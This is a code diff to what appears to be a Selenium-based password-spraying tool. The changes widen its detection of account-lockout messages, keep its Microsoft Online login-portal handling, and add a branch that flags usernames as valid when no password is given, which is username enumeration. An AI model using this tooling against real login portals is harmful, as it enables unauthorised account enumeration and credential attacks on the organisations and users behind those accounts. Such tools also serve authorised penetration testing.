@@ -168,7 +168,7 @@ def prepare_invalid_username(invalid_username=None):
 
 
 def prepare_lockout(lockout_messages=None):
-    final_list = ["account has been locked out", "too many login attempts"]
+    final_list = ["account has been locked out", "too many login attempts", "your account is temporarily locked"]
     if lockout_messages:
         invalid_username = lockout_messages.split(",")
         final_list.extend(invalid_username)
@@ -408,6 +408,7 @@ def attempt_login(spray_config, proxy_url):
     except TimeoutException:
         input_box.send_keys(Keys.RETURN)
         sleep(1)  # Wait for the page to load
+
         # Specific to the Microsoft Online login portal
         if "Microsoft" and "Work or school account" in driver.page_source:
             work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
@@ -426,6 +427,10 @@ def attempt_login(spray_config, proxy_url):
         driver.close()
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - PASSWORDLESS: {spray_config.username}")
         return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "PASSWORDLESS"}
+    elif not spray_config.password:
+        driver.close()
+        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}VALID USERNAME{Colors.END}: {spray_config.username}")
+        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "VALID USERNAME"}
 
     try:
         WebDriverWait(driver, 3).until(
